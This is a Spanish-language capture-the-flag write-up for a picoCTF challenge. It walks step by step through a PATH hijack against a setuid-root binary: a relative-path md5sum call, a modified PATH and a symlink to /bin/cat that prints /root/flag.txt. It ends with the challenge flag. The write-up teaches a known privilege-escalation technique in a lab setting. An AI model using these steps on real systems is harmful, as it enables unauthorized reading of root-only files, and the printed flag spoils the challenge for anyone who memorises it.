@@ -1,0 +1,52 @@
+Nos conectamos por medio de SSH, y ejecutamos un binario que se llama flaghasher. El binario hace lo siguiente:
+
+Computing the MD5 hash of /root/flag.txt.... 
+
+3ee596cb43d03dbe167e9f25f37ac940  /root/flag.txt
+
+Lo que nos dice es que esta encriptando el flag.txt que se encuentra en la carpeta root. Intentamos entrar a la
+carpeta root pero no tenemos acceso. Descargamos el binario y lo analizamos.
+
+Le aplicamos un strings o lo analizamos en Ghidra, como se prefiera y encontramos lo siguiente:
+
+Computing the MD5 hash of /root/flag.txt.... 
+/bin/bash -c 'md5sum /root/flag.txt'
+
+Se esta encriptando con la instruccion md5sum, pero tiene una ruta relativa ahi esta la vulnerabilidad. Porque
+al ser una ruta relativa Linux lo que hace es buscar el archivo md5sum en base a lo que diga la variable de entorno
+PATH. Si hago un echo a la variable $PATH
+
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+Lo que vamos a hacer en añadir la ruta donde nosotros estamos.
+
+export PATH=".":$PATH
+
+Y ahora si hacemos un echo de nuevo:
+
+echo $PATH
+.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+Entonces ahora lo que vamos a hacer en un archivo md5sum, que tenga un soft link a la instruccion cat, para que solo
+imprima el flag en texto plano:
+
+La sintaxis es la siguiente:
+
+ln -s /bin/cat md5sum
+
+Al hacer un ls -la vamosma ver lo siguiente:
+
+drwxr-xr-x 1 ctf-player ctf-player    34 Aug 26 19:32 .
+drwxr-xr-x 1 root       root          24 Aug 21 19:35 ..
+drwx------ 2 ctf-player ctf-player    34 Aug 26 19:20 .cache
+-rw-r--r-- 1 root       root          67 Aug 21 19:35 .profile
+-rwsr-xr-x 1 root       root       18312 Aug 21 19:35 flaghasher
+lrwxrwxrwx 1 ctf-player ctf-player     8 Aug 26 19:32 md5sum -> /bin/cat
+
+Podemos notas que el archivo md5sum es un link a la instruccion /bin/cat, ahora solo queda ejecutar el flaghasher y
+tenemos el flag:
+
+Computing the MD5 hash of /root/flag.txt.... 
+
+picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_7cb2e55a}
